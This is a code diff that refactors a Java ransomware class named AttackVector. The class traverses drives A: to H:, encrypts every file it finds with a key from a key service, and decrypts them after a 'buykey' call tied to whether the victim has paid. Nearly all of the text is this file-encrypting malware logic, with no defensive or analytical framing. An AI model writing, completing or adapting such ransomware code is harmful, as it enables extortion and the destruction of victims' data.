@@ -3,7 +3,6 @@ package Agent.Attack;
 import java.io.File;
 import java.util.ArrayList;
 import java.util.Collection;
-import java.util.LinkedList;
 import java.util.Map;
 
 import Agent.EncryptionAlgo.CryptoAlgorithm;
@@ -14,63 +13,32 @@ import Agent.services.KeyService;
 import Agent.traversal.*;
 
 public class AttackVector {
+
 	private KeyService keyService;
+	private Cryptable cryptFunc;
+	private Collection<File> visitedFolders;
 
-	// Gets a boolean variable which represent if the costumer paid his debt
-	// If he did , the function calls to decrypt the file system - else - encrypt
-	// it.
-	public void cryptFileSystem(boolean isPaid) throws RansomwareException {
-
-		// Traverse<File> dfs = new DFS<File>();
+	public void encryptFileSystem() throws RansomwareException {
+		Traverse<File> dfs = new DFS<File>();
 		// or
 		Traverse<File> bfs = new BFS<File>();
+		cryptFunc = new EncryptFile();
+		for (char i = 'A'; i <= 'H'; i++) {
 
-		CryptoAlgorithm crypto;
-		CryptoKey key = new CryptoKey();
-		Collection<File> visitedFolders = new ArrayList<File>();
-
-		if (!isPaid) {
-			key = keyService.getKey();
-			crypto = getCryptClass(AlgorithmsMap.getMap(), key.getAlgorithm());
-			encryptFileSystem(keyService.getKey(), bfs, crypto, visitedFolders);
-		} else {
-			key = keyService.buykey();
-			crypto = getCryptClass(AlgorithmsMap.getMap(), key.getAlgorithm());
-			decryptFileSystem(keyService.buykey(), bfs, crypto, visitedFolders);
+			traverseAndCrypt(i + ":\\", visitedFolders, keyService.getKey(), bfs, cryptFunc);
 
 		}
 
 	}
 
-	// Gets all of the files in the file system and encrypts them
-	private void encryptFileSystem(CryptoKey key, Traverse<File> struct, CryptoAlgorithm crypto,
-			Collection<File> visitedFolders) throws RansomwareException {
-
+	public void decryptFileSystem() throws RansomwareException {
+		Traverse<File> dfs = new DFS<File>();
+		// or
+		Traverse<File> bfs = new BFS<File>();
+		cryptFunc = new DecryptFile();
 		for (char i = 'A'; i <= 'H'; i++) {
-			LinkedList<File> visitedFiles = traverseFileSystem(i + ":\\", visitedFolders, key, struct);
-			try {
-				while (!(visitedFiles.isEmpty()))
-					crypto.encrypt(key.getKey(), visitedFiles.remove());
-			} catch (RansomwareException e) {
-				throw new RansomwareException(e.getCause());
-			}
-		}
+			traverseAndCrypt(i + ":\\", visitedFolders, keyService.buykey(), bfs, cryptFunc);
 
-	}
-
-	// Gets all of the encrypted files in the files system and decrypts them
-	private void decryptFileSystem(CryptoKey key, Traverse<File> struct, CryptoAlgorithm crypto,
-			Collection<File> visitedFolders) throws RansomwareException {
-
-		for (char i = 'A'; i <= 'H'; i++) {
-			LinkedList<File> visitedFiles = traverseFileSystem(i + ":\\", visitedFolders, key, struct);
-			try {
-				while (!(visitedFiles.isEmpty())) {
-					crypto.decrypt(key.getKey(), visitedFiles.remove());
-				}
-			} catch (RansomwareException e) {
-				throw new RansomwareException(e.getCause());
-			}
 		}
 	}
 
@@ -84,11 +52,11 @@ public class AttackVector {
 		return folderTree.stream().parallel().anyMatch(t -> t.equals(file));
 	}
 
-	// Traverse the whole file system and adds files to linked list ---> return the
-	// linked list to the encrypt/decrypt functions
-	private LinkedList<File> traverseFileSystem(String inputDir, Collection<File> dirs, CryptoKey key,
-			Traverse<File> struct) {
-		LinkedList<File> visitedFiles = new LinkedList<File>();
+	private void traverseAndCrypt(String inputDir, Collection<File> dirs, CryptoKey key, Traverse<File> struct,
+			Cryptable cryptoFunc) throws RansomwareException {
+
+		CryptoAlgorithm crypto = getCryptClass(AlgorithmsMap.getMap(), key.getAlgorithm());
+
 		struct.add(new File(inputDir));
 		while (!(struct.isEmpty())) {
 			/* get next file/directory */
@@ -106,14 +74,13 @@ public class AttackVector {
 						}
 
 					} else if (file.isFile()) {
-						visitedFiles.add(file);
+
+						cryptoFunc.doingCrypto(key, file, crypto);
 
 					}
 				}
 			}
 
 		}
-		return visitedFiles;
-
 	}
 }
